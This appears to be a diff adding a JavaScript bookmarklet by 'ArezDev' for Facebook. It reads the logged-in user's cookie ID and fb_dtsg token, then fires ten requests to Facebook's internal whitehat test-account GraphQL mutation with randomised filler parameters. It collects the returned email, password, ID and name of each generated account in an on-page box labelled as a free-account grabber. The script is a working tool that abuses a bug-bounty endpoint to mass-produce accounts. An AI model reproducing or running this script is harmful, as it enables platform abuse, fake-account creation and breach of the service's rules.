@@ -1,0 +1,141 @@
+javascript: void((function() {
+    body = document.body;
+    div = document.createElement('div');
+    div.id = 'informasi';
+    div.style.padding = '10px';
+    div.style.borderRadius = '25px';
+    div.style.width = '400px';
+    div.style.position = 'fixed';
+    div.style.zIndex = '9999';
+    div.style.top = '5%';
+    div.style.left = '10%';
+    div.style.fontSize = '12px';
+    div.style.fontWeight = '600';
+    div.style.boxShadow = '0 0 15px #ffc0cb';
+    div.style.backgroundColor = 'rgba(255,255,255,0.8)';
+    div.innerHTML += '<h2 style=\'color:#000;padding:5px 10px;float:left;border:1px solid #ced0d4;cursor:pointer;display:inline-block;font-size:12px;border-radius:2px;-webkit-font-smoothing:antialiased;font-weight:bold;line-height:18px;text-align:center;text-decoration:none;text-shadow:none;vertical-align:top;white-space:nowrap;left:0px;\'>Njupok Akun Gratis :)</h2>
+	<button onclick=\'arezdev.tutup()\' style=\'background:red;color:#fff;padding:5px 10px;float:right;border:1px solid #ced0d4;cursor:pointer;display:inline-block;font-size:12px;border-radius:2px;-webkit-font-smoothing:antialiased;font-weight:bold;line-height:18px;text-align:center;text-decoration:none;text-shadow:none;vertical-align:top;white-space:nowrap\'>X</button>
+	<br/><br/>
+	<div style = \'margin-top:10px\' id=\'divsatu\'>
+    <div style=\'margin-top:10px\' id=\'laporan\'></div> </div> 
+	<textarea placeholder=\'Laporan...\' id=\'report\' style=\'width:390px;height:150px;border-radius:2px;resize:none;overflow-y:scroll;\'></textarea> <div style=\'text-align:center;display:inline-block\'> 
+	<div style=\'text-align:center;color:#0033cc\'><p>Made with 💖 By ArezDev</p></div>';
+    body.appendChild(div);
+	
+	window.arezdev = {
+        tutup: function() {
+            var formku = document.getElementById('informasi');
+            formku.parentNode.removeChild(formku)
+        },
+        hapus: function() {
+            document.getElementById('targetUID').value = "";
+            document.getElementById('targetLINK').value = "";
+            document.getElementById("report").value = "";
+        },
+		ngarangHuruf: function(length) {
+	var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+   }
+   return result;
+		},
+		ngarangNomer: function(length) {
+	var result           = '';
+    var characters       = '0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+   }
+   return result;
+		},
+		mulai: function(){
+		start();
+		start();
+		start();
+		start();
+		start();
+		start();
+		start();
+		start();
+		start();
+		start();
+		},
+		tes: function(){
+		start();
+		}
+    };
+	
+	function start(){
+	
+		 var uidku = document.cookie.match(/c_user=(\d+)/)[1];
+         var dyn1 = arezdev.ngarangHuruf(63);
+         var dyn2 = arezdev.ngarangHuruf(60);
+         var dyn3 = arezdev.ngarangHuruf(43);
+         var dyn4 = arezdev.ngarangHuruf(40);
+         var csr1 = arezdev.ngarangHuruf(18);
+         var csr2 = arezdev.ngarangHuruf(19);
+         var csr3 = arezdev.ngarangHuruf(97);
+         var csr4 = arezdev.ngarangHuruf(72);
+         var csr5 = arezdev.ngarangHuruf(56);
+         var __s1 = arezdev.ngarangHuruf(6);
+         var __s2 = arezdev.ngarangHuruf(6);
+         var __s3 = arezdev.ngarangHuruf(6);
+         var _hsi = arezdev.ngarangNomer(19);
+         var fb_dtsgx = window.fb_dtsg;
+         var _lsd = arezdev.ngarangHuruf(22);
+         var _jazoest = arezdev.ngarangNomer(5);
+         var _spin_r = arezdev.ngarangNomer(10);
+         var _spin_t = arezdev.ngarangNomer(10);
+         var variabel = JSON.stringify({"input":{"client_mutation_id":"1","actor_id":""+ uidku +"","privacy_mutation_token":"eyJjYWxsc2l0ZV9pZCI6NTA2NDkyOTI3NDU0MDI3LCJjcmVhdGlvbl90aW1lIjoxNjY4NDQxNjQwODIzLCJ0eXBlIjowfQ=="}});
+
+fetch("https://web.facebook.com/api/graphql/", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "en-US,en;q=0.9",
+    "content-type": "application/x-www-form-urlencoded",
+    "sec-ch-prefers-color-scheme": "light",
+    "sec-ch-ua": "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Windows\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "viewport-width": "890",
+    "x-fb-friendly-name": "useWhitehatCreateTestAccountMutation"
+  },
+  "referrer": "https://web.facebook.com/whitehat/accounts",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "av="+ uidku +"&__user="+ uidku +"&__a=1&__dyn="+ dyn1 +"&__csr="+ csr1 +"&__req=v&__hs=&dpr=&__ccg=MODERATE&__rev=1006599348&__s=kdaol8%3Atdqace%3Aemlral&__hsi="+ _hsi +"&__comet_req=15&fb_dtsg="+ fb_dtsgx +"&jazoest="+ _jazoest +"&lsd=&__spin_r="+ _spin_r +"&__spin_b=trunk&__spin_t="+ _spin_t +"&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useWhitehatCreateTestAccountMutation&variables="+ variabel +"&server_timestamps=true&doc_id=4971570192918643&fb_api_analytics_tags=",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+}).then((response) => {
+return response.json().then((data) => {
+console.log(data.data.xfb_whitehat_create_test_account.test_account.email);
+console.log(data);
+var emaile = data.data.xfb_whitehat_create_test_account.test_account.email;
+var passworde = data.data.xfb_whitehat_create_test_account.test_account.password;
+var uide = data.data.xfb_whitehat_create_test_account.test_account.id;
+var namae = data.data.xfb_whitehat_create_test_account.test_account.name;
+document.getElementById("report").value = uide + "|" + passworde + "|" + emaile + "|" + namae + "\n";
+}).catch((err) => {
+console.log(err);
+});
+});
+
+}
+
+		start();
+		start();
+		start();
+		start();
+		start();
+		start();
+		start();
+		start();
+		start();
+		start();
+	
+})());
